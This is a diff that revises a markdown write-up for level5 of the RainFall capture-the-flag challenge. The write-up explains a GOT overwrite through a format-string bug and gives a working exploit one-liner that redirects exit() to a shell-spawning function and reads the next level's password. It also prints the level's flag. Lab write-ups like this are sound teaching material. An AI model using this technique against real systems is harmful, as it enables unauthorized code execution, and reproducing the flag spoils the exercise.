@@ -3,7 +3,7 @@
 - Once logged in, you will see a binary `level5`
 
 ```
-[???] ssh level5@localhost -p 4242
+$ ssh level5@localhost -p 4242
 	  _____       _       ______    _ _
 	 |  __ \     (_)     |  ____|  | | |
 	 | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -35,7 +35,7 @@ aaaaaaaaaaaa
 level5@RainFall:~$
 ```
 
-let's take a look at the assembly:
+Let's take a look at the assembly:
 
 ```
 gdb-peda$ info functions
@@ -47,7 +47,7 @@ gdb-peda$ info functions
 0x080485cc  _fini
 ```
 
-there are three function declared in the program, so let's take a look at each
+There are three function declared in the program, so let's take a look at each.
 
 ```
 gdb-peda$ disass main
@@ -103,13 +103,12 @@ gdb-peda$ x/s 0x80485f0
 0x80485f0:	 "/bin/sh"
 ```
 
-by decompile the code, on `n` function, the exit() is called, we can replace the address call of `exit()` to `o()`.
-Below is the explanation of GOT:
-```
-ref: https://www.mattandreko.com/2012/02/02/exploit-exercises-protostar-format-4/
+By decompiling the code, we find that the function `n` is called, but unfortunately the `o` function is never called. In this exploit, we will replace the address of the call to `exit()` with the address of `o`.
 
-What initially caught my eye was the fact that there was a call to “exit()” as well as “_exit()“. This made me think back to my reading, and I realized it was going to be a GOT (Global Offset Table) overwrite on “exit()”. When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions. The first time it runs that function, it will cache the memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function. In this case, our victim is “exit()”.
-```
+We'll accomplish this by filling in the GOT (Global Offset Table) cache before it gets written.
+
+Below is an explanation of GOT from [here](https://www.mattandreko.com/2012/02/02/exploit-exercises-protostar-format-4/):
+> When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions. The first time it runs that function, it will cache the memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.
 
 The memory address of `exit()` can be acquired by using `objdump`
 
@@ -131,27 +130,21 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
 
-The only thing left is to overrite value `0x080484a4 -> address of o()` into `0x08049838 ->exit()`'s address, by format string explicit used on printf, the same technique used by last problem.
+The only thing left is to overwrite value `0x080484a4` (address of `o`) into `0x08049838` (address of exit) using a format string exploit, the same technique used by last problem.
 
 ```
 Python 3.10.4 (v3.10.4:9d38120e33, Mar 23 2022, 17:29:05) [Clang 13.0.0 (clang-1300.0.29.30)] on darwin
 Type "help", "copyright", "credits" or "license" for more information.
 >>> 0x080484a4
 134513828
->>>
 ```
-We know `0x80484a4` is `134513828` in decimal, that needs to be written on `0x08049838` -> `\x38\x98\x04\x08`
 
+`0x80484a4` is `134513828` in decimal, which is the value that needs to be written on `0x08049838`, which is `\x38\x98\x04\x08` in little endian.
+
+Voilà our exploit:
 
 ```
 level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
-```
-
-with waiting priting multiple spaces...
-
-the flage will be given.
-
-```
 [...]
                               200
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
